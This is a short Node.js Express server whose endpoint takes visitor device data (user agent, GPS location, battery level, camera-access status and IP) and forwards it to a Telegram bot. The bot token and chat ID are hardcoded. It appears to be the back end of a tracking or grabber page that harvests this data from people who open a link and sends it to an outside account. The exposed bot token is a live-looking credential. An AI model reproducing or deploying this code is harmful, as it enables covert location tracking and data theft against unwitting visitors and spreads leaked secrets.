const express = require('express');
const path = require('path');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// API endpoint to send data to Telegram
app.post('/send-to-telegram', express.json(), async (req, res) => {
  try {
    const { deviceInfo } = req.body;
    const chatId = '8072184460';
    const botToken = '7631919452:AAHnt0DZTaf4vpEWrot_BMpwBPyJb7qOHsw';
    
    const message = `
🚀 New Device Information:
📱 User Agent: ${deviceInfo.userAgent || 'N/A'}
📍 Location: ${deviceInfo.location ? `${deviceInfo.location.latitude}, ${deviceInfo.location.longitude}` : 'N/A'}
🔋 Battery: ${deviceInfo.battery ? `${deviceInfo.battery.level * 100}%` : 'N/A'}
📸 Camera Access: ${deviceInfo.cameraAccess ? 'Granted' : 'Denied'}
🌐 IP: ${deviceInfo.ip || 'N/A'}
🕒 Time: ${new Date().toISOString()}
    `;

    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message
    });

    res.status(200).send('Data sent to Telegram');
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).send('Error sending data');
  }
});

// Serve the HTML file for all routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});